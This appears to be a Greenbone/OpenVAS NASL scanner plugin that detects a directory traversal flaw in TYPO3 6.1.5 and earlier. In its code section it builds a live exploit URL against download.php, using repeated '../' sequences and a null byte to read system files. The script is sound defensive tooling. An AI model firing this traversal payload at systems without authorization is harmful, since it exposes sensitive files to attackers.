CPE = "cpe:/a:typo3:typo3";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803776" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-11-20 11:33:55 +0530 (Wed, 20 Nov 2013)" );
	script_name( "Typo3 Multiple Directory Traversal Vulnerabilities" );
	script_tag( name: "impact", value: "Successful exploitation may allow an attacker to obtain sensitive information,
which can lead to launching further attacks." );
	script_tag( name: "affected", value: "Typo3 version 6.1.5 and probably before." );
	script_tag( name: "insight", value: "Multiple flaws are due to improper validation of user-supplied input via
'file' and 'path' parameters, which allows attackers to read arbitrary files
via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it
is able to read the system file or not." );
	script_tag( name: "summary", value: "This host is running Typo3 and is prone to multiple directory traversal
vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/29355" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/php/typo3-directory-traversal-vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_typo3_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "TYPO3/installed" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/fileadmin/scripts/download.php?path=" + crap( data: "../", length: 3 * 15 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

